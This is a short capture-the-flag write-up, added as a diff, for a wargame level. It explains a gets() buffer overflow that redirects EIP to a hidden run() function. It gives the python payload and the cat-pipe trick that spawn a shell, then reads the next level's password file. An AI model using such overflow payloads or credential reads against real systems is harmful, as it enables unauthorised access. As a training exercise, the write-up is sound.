@@ -1,0 +1,23 @@
+level1 binary with the rights of level2
+
+objdump -d level1 tells us that in main there is a gets function 
+and a 'run' function not called on address 0x08048444 that fwrites something and then does a system call.
+
+gets doesnt check the size of the string we give it so it is exploitable.
+-> buffer overflow will cause the eip register to be overwritten
+
+after some testing we find out that we overwrite eip with characters of index 77 to 80.
+if we try with 76 'a' char and then 'ABCD' we see that we are using little Endian system
+we verify this with 'lscpu' -> Indeed little Endian
+
+chmod 777 .
+python -c 'print("a"*76 + "\x44\x84\x04\x08")' > file
+chmod 777 file
+cat file - | ./level1
+
+without the '-' in the cat call we do enter run() function and "Good... Wait what?" is written (fwrite call)
+but we just segfault and level1 stops running
+'-' allows us to still use stdin after everything is done with the first argument.
+
+we are inside a shell as level2
+we can 'cat /home/user/level2/.pass' and get to the next level
